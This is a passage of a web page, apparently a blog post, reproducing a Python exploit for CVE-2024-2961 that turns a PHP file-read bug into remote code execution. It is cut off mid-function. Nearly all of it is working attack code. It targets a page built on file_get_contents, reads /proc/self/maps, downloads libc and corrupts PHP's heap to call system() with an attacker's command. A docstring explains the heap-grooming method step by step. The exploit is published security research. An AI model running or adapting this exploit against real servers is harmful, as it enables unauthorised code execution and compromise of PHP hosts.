class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># CNEXT: PHP file-read to RCE (CVE-2024-2961)</span><br><span class="hljs-comment"># Date: 2024-05-27</span><br><span class="hljs-comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># TODO Parse LIBC to know if patched</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># INFORMATIONS</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># REQUIREMENTS</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Requires ten: https://github.com/cfreal/ten</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> annotations<br><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> zlib<br><br><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass<br><span class="hljs-keyword">from</span> requests.exceptions <span class="hljs-keyword">import</span> ConnectionError, ChunkedEncodingError<br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ten <span class="hljs-keyword">import</span> *<br><br><br>HEAP_SIZE = <span class="hljs-number">2</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span><br>BUG = <span class="hljs-string">&quot;劄&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Remote</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A helper class to send the payload and download files.</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    The logic of the exploit is always the same, but the exploit needs to know how to</span><br><span class="hljs-string">    download files (/proc/self/maps and libc) and how to send the payload.</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    The code here serves as an example that attacks a page that looks like:</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    ```php</span><br><span class="hljs-string">    &lt;?php</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    $data = file_get_contents($_POST[&#x27;file&#x27;]);</span><br><span class="hljs-string">    echo &quot;File contents: $data&quot;;</span><br><span class="hljs-string">    ```</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    Tweak it to fit your target, and start the exploit.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, url: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-variable language_">self</span>.url = url<br>        <span class="hljs-variable language_">self</span>.session = Session()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; Response:<br>        <span class="hljs-string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.session.post(<span class="hljs-variable language_">self</span>.url, data=&#123;<span class="hljs-string">&quot;url&quot;</span>: path&#125;)<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Returns the contents of a remote file.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;</span><br>        path = <span class="hljs-string">f&quot;file://localhost/<span class="hljs-subst">&#123;path&#125;</span>&quot;</span><br>        response = <span class="hljs-variable language_">self</span>.send(path)<br>        <span class="hljs-comment"># data = response.re.search(b&quot;File contents: (.*)&quot;, flags=re.S).group(1)</span><br>        <span class="hljs-comment"># return base64.decode(data)</span><br>        <span class="hljs-keyword">return</span> response.content<br><br><span class="hljs-meta">@entry</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&quot;Target URL&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;command&quot;</span>, <span class="hljs-string">&quot;Command to run on the system; limited to 0x140 bytes&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;sleep_time&quot;</span>, <span class="hljs-string">&quot;Time to sleep to assert that the exploit worked. By default, 1.&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;heap&quot;</span>, <span class="hljs-string">&quot;Address of the main zend_mm_heap structure.&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;pad&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;Number of 0x100 chunks to pad with. If the website makes a lot of heap &quot;</span></span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;operations with this size, increase this. Defaults to 20.&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-meta"></span>)</span><br><span class="hljs-meta">@dataclass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;CNEXT exploit: RCE using a file read primitive in PHP.&quot;&quot;&quot;</span><br><br>    url: <span class="hljs-built_in">str</span><br>    command: <span class="hljs-built_in">str</span><br>    sleep: <span class="hljs-built_in">int</span> = <span class="hljs-number">1</span><br>    heap: <span class="hljs-built_in">str</span> = <span class="hljs-literal">None</span><br>    pad: <span class="hljs-built_in">int</span> = <span class="hljs-number">20</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__post_init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.remote = Remote(<span class="hljs-variable language_">self</span>.url)<br>        <span class="hljs-variable language_">self</span>.log = logger(<span class="hljs-string">&quot;EXPLOIT&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.info = &#123;&#125;<br>        <span class="hljs-variable language_">self</span>.heap = <span class="hljs-variable language_">self</span>.heap <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(<span class="hljs-variable language_">self</span>.heap, <span class="hljs-number">16</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_vulnerable</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various</span><br><span class="hljs-string">        wrappers and filters that the exploit needs.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_download</span>(<span class="hljs-params">path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.remote.download(path)<br>            <span class="hljs-keyword">except</span> ConnectionError:<br>                failure(<span class="hljs-string">&quot;Target not [b]reachable[/] ?&quot;</span>)<br>            <br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_token</span>(<span class="hljs-params">text: <span class="hljs-built_in">str</span>, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>            result = safe_download(path)<br>            <span class="hljs-keyword">return</span> text.encode() == result<br><br>        text = tf.random.string(<span class="hljs-number">50</span>).encode()<br>        base64 = b64(text, misalign=<span class="hljs-literal">True</span>).decode()<br>        path = <span class="hljs-string">f&quot;data:text/plain;base64,<span class="hljs-subst">&#123;base64&#125;</span>&quot;</span><br>        <br>        result = safe_download(path)<br>        <br>        <span class="hljs-keyword">if</span> text <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> result:<br>            msg_failure(<span class="hljs-string">&quot;Remote.download did not return the test string&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--------------------&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Expected test string: <span class="hljs-subst">&#123;text&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Got: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--------------------&quot;</span>)<br>            failure(<span class="hljs-string">&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;</span>)<br><br>        msg_info(<span class="hljs-string">&quot;The [i]data://[/] wrapper works&quot;</span>)<br><br>        text = tf.random.string(<span class="hljs-number">50</span>)<br>        base64 = b64(text.encode(), misalign=<span class="hljs-literal">True</span>).decode()<br>        path = <span class="hljs-string">f&quot;php://filter//resource=data:text/plain;base64,<span class="hljs-subst">&#123;base64&#125;</span>&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_token(text, path):<br>            failure(<span class="hljs-string">&quot;The [i]php://filter/[/] wrapper does not work&quot;</span>)<br><br>        msg_info(<span class="hljs-string">&quot;The [i]php://filter/[/] wrapper works&quot;</span>)<br><br>        text = tf.random.string(<span class="hljs-number">50</span>)<br>        base64 = b64(compress(text.encode()), misalign=<span class="hljs-literal">True</span>).decode()<br>        path = <span class="hljs-string">f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,<span class="hljs-subst">&#123;base64&#125;</span>&quot;</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_token(text, path):<br>            failure(<span class="hljs-string">&quot;The [i]zlib[/] extension is not enabled&quot;</span>)<br><br>        msg_info(<span class="hljs-string">&quot;The [i]zlib[/] extension is enabled&quot;</span>)<br><br>        msg_success(<span class="hljs-string">&quot;Exploit preconditions are satisfied&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-keyword">with</span> msg_status(<span class="hljs-string">f&quot;Downloading [i]<span class="hljs-subst">&#123;path&#125;</span>[/]...&quot;</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.remote.download(path)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_regions</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">list</span>[Region]:<br>        <span class="hljs-string">&quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;</span><br>        maps = <span class="hljs-variable language_">self</span>.get_file(<span class="hljs-string">&quot;/proc/self/maps&quot;</span>)<br>        maps = maps.decode()<br>        PATTERN = re.<span class="hljs-built_in">compile</span>(<br>            <span class="hljs-string">r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot;</span> <span class="hljs-string">r&quot;.*&quot;</span> <span class="hljs-string">r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot;</span> <span class="hljs-string">r&quot;(.*)&quot;</span><br>        )<br>        regions = []<br>        <span class="hljs-keyword">for</span> region <span class="hljs-keyword">in</span> table.split(maps, strip=<span class="hljs-literal">True</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> := PATTERN.<span class="hljs-keyword">match</span>(region):<br>                start = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-number">16</span>)<br>                stop = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)<br>                permissions = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)<br>                path = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">4</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;[&quot;</span> <span class="hljs-keyword">in</span> path:<br>                    path = path.rsplit(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-number">1</span>)[-<span class="hljs-number">1</span>]<br>                <span class="hljs-keyword">else</span>:<br>                    path = <span class="hljs-string">&quot;&quot;</span><br>                current = Region(start, stop, permissions, path)<br>                regions.append(current)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(maps)<br>                failure(<span class="hljs-string">&quot;Unable to parse memory mappings&quot;</span>)<br><br>        <span class="hljs-variable language_">self</span>.log.info(<span class="hljs-string">f&quot;Got <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(regions)&#125;</span> memory regions&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> regions<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_symbols_and_addresses</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;</span><br>        regions = <span class="hljs-variable language_">self</span>.get_regions()<br><br>        LIBC_FILE = <span class="hljs-string">&quot;/dev/shm/cnext-libc&quot;</span><br><br>        <span class="hljs-comment"># PHP&#x27;s heap</span><br><br>        <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;heap&quot;</span>] = <span class="hljs-variable language_">self</span>.heap <span class="hljs-keyword">or</span> <span class="hljs-variable language_">self</span>.find_main_heap(regions)<br><br>        <span class="hljs-comment"># Libc</span><br><br>        libc = <span class="hljs-variable language_">self</span>._get_region(regions, <span class="hljs-string">&quot;libc-&quot;</span>, <span class="hljs-string">&quot;libc.so&quot;</span>)<br><br>        <span class="hljs-variable language_">self</span>.download_file(libc.path, LIBC_FILE)<br><br>        <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;libc&quot;</span>] = ELF(LIBC_FILE, checksec=<span class="hljs-literal">False</span>)<br>        <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;libc&quot;</span>].address = libc.start<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_region</span>(<span class="hljs-params">self, regions: <span class="hljs-built_in">list</span>[Region], *names: <span class="hljs-built_in">str</span></span>) -&gt; Region:<br>        <span class="hljs-string">&quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> region <span class="hljs-keyword">in</span> regions:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(name <span class="hljs-keyword">in</span> region.path <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> names):<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            failure(<span class="hljs-string">&quot;Unable to locate region&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> region<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file</span>(<span class="hljs-params">self, remote_path: <span class="hljs-built_in">str</span>, local_path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;</span><br>        data = <span class="hljs-variable language_">self</span>.get_file(remote_path)<br>        Path(local_path).write(data)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_main_heap</span>(<span class="hljs-params">self, regions: <span class="hljs-built_in">list</span>[Region]</span>) -&gt; Region:<br>        <span class="hljs-comment"># Any anonymous RW region with a size superior to the base heap size is a</span><br>        <span class="hljs-comment"># candidate. The heap is at the bottom of the region.</span><br>        heaps = [<br>            region.stop - HEAP_SIZE + <span class="hljs-number">0x40</span><br>            <span class="hljs-keyword">for</span> region <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(regions)<br>            <span class="hljs-keyword">if</span> region.permissions == <span class="hljs-string">&quot;rw-p&quot;</span><br>            <span class="hljs-keyword">and</span> region.size &gt;= HEAP_SIZE<br>            <span class="hljs-keyword">and</span> region.stop &amp; (HEAP_SIZE-<span class="hljs-number">1</span>) == <span class="hljs-number">0</span><br>            <span class="hljs-keyword">and</span> region.path == <span class="hljs-string">&quot;&quot;</span><br>        ]<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> heaps:<br>            failure(<span class="hljs-string">&quot;Unable to find PHP&#x27;s main heap in memory&quot;</span>)<br><br>        first = heaps[<span class="hljs-number">0</span>]<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(heaps) &gt; <span class="hljs-number">1</span>:<br>            heaps = <span class="hljs-string">&quot;, &quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">hex</span>, heaps))<br>            msg_info(<span class="hljs-string">f&quot;Potential heaps: [i]<span class="hljs-subst">&#123;heaps&#125;</span>[/] (using first)&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            msg_info(<span class="hljs-string">f&quot;Using [i]<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(first)&#125;</span>[/] as heap&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> first<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># self.check_vulnerable()</span><br>        <span class="hljs-variable language_">self</span>.get_symbols_and_addresses()<br>        <span class="hljs-variable language_">self</span>.exploit()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit_path</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;On each step of the exploit, a filter will process each chunk one after the</span><br><span class="hljs-string">        other. Processing generally involves making some kind of operation either</span><br><span class="hljs-string">        on the chunk or in a destination chunk of the same size. Each operation is</span><br><span class="hljs-string">        applied on every single chunk; you cannot make PHP apply iconv on the first 10</span><br><span class="hljs-string">        chunks and leave the rest in place. That&#x27;s where the difficulties come from.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Keep in mind that we know the address of the main heap, and the libraries.</span><br><span class="hljs-string">        ASLR/PIE do not matter here.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        The idea is to use the bug to make the freelist for chunks of size 0x100 point</span><br><span class="hljs-string">        lower. For instance, we have the following free list:</span><br><span class="hljs-string"></span><br><span class="hljs-string">        ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00</span><br><span class="hljs-string"></span><br><span class="hljs-string">        By triggering the bug from chunk ..900, we get:</span><br><span class="hljs-string"></span><br><span class="hljs-string">        ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???</span><br><span class="hljs-string"></span><br><span class="hljs-string">        That&#x27;s step 3.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Now, in order to control the free list, and make it point whereever we want,</span><br><span class="hljs-string">        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,</span><br><span class="hljs-string">        we&#x27;d have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.</span><br><span class="hljs-string">        That&#x27;s step 2.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Now, if we were to perform step2 an then step3 without anything else, we&#x27;d have</span><br><span class="hljs-string">        a problem: after step2 has been processed, the free list goes bottom-up, like:</span><br><span class="hljs-string"></span><br><span class="hljs-string">        0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900</span><br><span class="hljs-string"></span><br><span class="hljs-string">        We need to go the other way around. That&#x27;s why we have step 1: it just allocates</span><br><span class="hljs-string">        chunks. When they get freed, they reverse the free list. Now step2 allocates in</span><br><span class="hljs-string">        reverse order, and therefore after step2, chunks are in the correct order.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Another problem comes up.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.</span><br><span class="hljs-string">        Since step2 creates chunks that contain pointers and pointers are generally not</span><br><span class="hljs-string">        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.</span><br><span class="hljs-string">        To avoid this, we put the chunks in step2 at the very end of the chain, and</span><br><span class="hljs-string">        prefix them with `0\n`. When dechunked (right before the iconv), they will</span><br><span class="hljs-string">        &quot;disappear&quot; from the chain, preserving them from the character set conversion</span><br><span class="hljs-string">        and saving us from an unwanted processing error that would stop the processing</span><br><span class="hljs-string">        chain.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        After step3 we have a corrupted freelist with an arbitrary pointer into it. We</span><br><span class="hljs-string">        don&#x27;t know the precise layout of the heap, but we know that at the top of the</span><br><span class="hljs-string">        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.</span><br><span class="hljs-string">        Its free_slot[] array contains a pointer to each free list. By overwriting it,</span><br><span class="hljs-string">        we can make PHP allocate chunks whereever we want. In addition, its custom_heap</span><br><span class="hljs-string">        field contains pointers to hook functions for emalloc, efree, and erealloc</span><br><span class="hljs-string">        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and</span><br><span class="hljs-string">        then overwrite the use_custom_heap flag to make PHP use these function pointers</span><br><span class="hljs-string">        instead. We can now do our favorite CTF technique and get a call to</span><br><span class="hljs-string">        system(&lt;chunk&gt;).</span><br><span class="hljs-string">        We make sure that the &quot;system&quot; command kills the current process to avoid other</span><br><span class="hljs-string">        system() calls with random chunk data, leading to undefined behaviour.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the</span><br><span class="hljs-string">        process is in a random state, we still get contiguous, in order chunks for our</span><br><span class="hljs-string">        exploit.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Therefore, the whole process described here CANNOT crash. Everything falls</span><br><span class="hljs-string">        perfectly in place, and nothing can get in the middle of our allocations.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br><br>        LIBC = <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;libc&quot;</span>]<br>        ADDR_EMALLOC = LIBC.symbols[<span class="hljs-string">&quot;__libc_malloc&quot;</span>]<br>        ADDR_EFREE = LIBC.symbols[<span class="hljs-string">&quot;__libc_system&quot;</span>]<br>        ADDR_EREALLOC = LIBC.symbols[<span class="hljs-string">&quot;__libc_realloc&quot;</span>]<br><br>        ADDR_HEAP = <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;heap&quot;</span>]<br>        ADDR_FREE_SLOT = ADDR_HEAP + <span class="hljs-number">0x20</span><br>        ADDR_CUSTOM_HEAP = ADDR_HEAP + <span class="hljs-number">0x0168</span><br><br>        ADDR_FAKE_BIN = ADDR_FREE_SLOT - <span class="hljs-number">0x10</span><br><br>        CS = <span class="hljs-number">0x100</span><br><br>        <span class="hljs-comment"># Pad needs to stay at size 0x100 at every step</span><br>        pad_size = CS - <span class="hljs-number">0x18</span><br>        pad = <span class="hljs-string">b&quot;\x00&quot;</span> * pad_size<br>        pad = chunked_chunk(pad, <span class="hljs-built_in">len</span>(pad) + <span class="hljs-number">6</span>)<br>        pad = chunked_chunk(pad, <span class="hljs-built_in">len</span>(pad) + <span class="hljs-number">6</span>)<br>        pad = chunked_chunk(pad, <span class="hljs-built_in">len</span>(pad) + <span class="hljs-number">6</span>)<br>        pad = compressed_bucket(pad)<br><br>        step1_size = <span class="hljs-number">1</span><br>        step1 = <span class="hljs-string">b&quot;\x00&quot;</span> * step1_size<br>        step1 = chunked_chunk(step1)<br>        step1 = chunked_chunk(step1)<br>        step1 = chunked_chunk(step1, CS)<br>        step1 = compressed_bucket(step1)<br><br>        <span class="hljs-comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span><br>        <span class="hljs-comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;</span><br><br>        step2_size = <span class="hljs-number">0x48</span><br>        step2 = <span class="hljs-string">b&quot;\x00&quot;</span> * (step2_size + <span class="hljs-number">8</span>)<br>        step2 = chunked_chunk(step2, CS)<br>        step2 = chunked_chunk(step2)<br>        step2 = compressed_bucket(step2)<br><br>        step2_write_ptr = <span class="hljs-string">b&quot;0\n&quot;</span>.ljust(step2_size, <span class="hljs-string">b&quot;\x00&quot;</span>) + p64(ADDR_FAKE_BIN)<br>        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)<br>        step2_write_ptr = chunked_chunk(step2_write_ptr)<br>        step2_write_ptr = compressed_bucket(step2_write_ptr)<br><br>        step3_size = CS<br><br>        step3 = <span class="hljs-string">b&quot;\x00&quot;</span> * step3_size<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(step3) == CS<br>        step3 = chunked_chunk(step3)<br>        step3 = chunked_chunk(step3)<br>        step3 = chunked_chunk(step3)<br>        step3 = compressed_bucket(step3)<br><br>        step3_overflow = <span class="hljs-string">b&quot;\x00&quot;</span> * (step3_size - <span class="hljs-built_in">len</span>(BUG)) + BUG<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(step3_overflow) == CS<br>        step3_overflow = chunked_chunk(step3_overflow)<br>        step3_overflow = chunked_chunk(step3_overflow)<br>        step3_overflow = chunked_chunk(step3_overflow)<br>        step3_overflow = compressed_bucket(step3_overflow)<br><br>        step4_size = CS<br>        step4 = <span class="hljs-string">b&quot;=00&quot;</span> + <span class="hljs-string">b&quot;\x00&quot;</span> * (step4_size - <span class="hljs-number">1</span>)<br>        step4 = chunked_chunk(step4)<br>        step4 = chunked_chunk(step4)<br>        step4 = chunked_chunk(step4)<br>        step4 = compressed_bucket(step4)<br><br>        <span class="hljs-comment"># This chunk will eventually overwrite mm_heap-&gt;free_slot</span><br>        <span class="hljs-comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span><br>        step4_pwn = ptr_bucket(<br>            <span class="hljs-number">0x200000</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-comment"># free_slot</span><br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            ADDR_CUSTOM_HEAP,  <span class="hljs-comment"># 0x18</span><br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            ADDR_HEAP,  <span class="hljs-comment"># 0x140</span><br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            size=CS,<br>        )<br><br>        step4_custom_heap = ptr_bucket(<br>            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=<span class="hljs-number">0x18</span><br>        )<br><br>        step4_use_custom_heap_size = <span class="hljs-number">0x140</span><br><br>        COMMAND = <span class="hljs-variable language_">self</span>.command<br>        COMMAND = <span class="hljs-string">f&quot;kill -9 $PPID; <span class="hljs-subst">&#123;COMMAND&#125;</span>&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.sleep:<br>            COMMAND = <span class="hljs-string">f&quot;sleep <span class="hljs-subst">&#123;self.sleep&#125;</span>; <span class="hljs-subst">&#123;COMMAND&#125;</span>&quot;</span><br>        COMMAND = COMMAND.encode() + <span class="hljs-string">b&quot;\x00&quot;</span><br><br>        <span class="hljs-keyword">assert</span> (<br>            <span class="hljs-built_in">len</span>(COMMAND) &lt;= step4_use_custom_heap_size<br>        ), <span class="hljs-string">f&quot;Command too big (<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(COMMAND)&#125;</span>), it must be strictly inferior to <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(step4_use_custom_heap_size)&#125;</span>&quot;</span><br>        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>        step4_use_custom_heap = COMMAND<br>        